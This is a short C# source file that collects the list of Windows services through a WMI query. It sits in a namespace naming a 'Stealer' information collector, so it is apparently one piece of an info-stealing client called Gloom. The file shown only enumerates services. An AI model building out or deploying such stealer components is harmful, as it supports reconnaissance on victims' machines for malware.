using Gloom.WmiOps;

namespace Gloom.Client.Features.Stealer.InfoCollector.Wmi;
internal class WmiServiceList : WmiInfo
{
	public WmiServiceList() : base(WmiOpCodes.ServiceList)
	{
	}

	public override object Collect()
	{
		return new ServiceListResponse
		{
			List = Crawl<Win32Service>("Win32_Service")
		};
	}
}
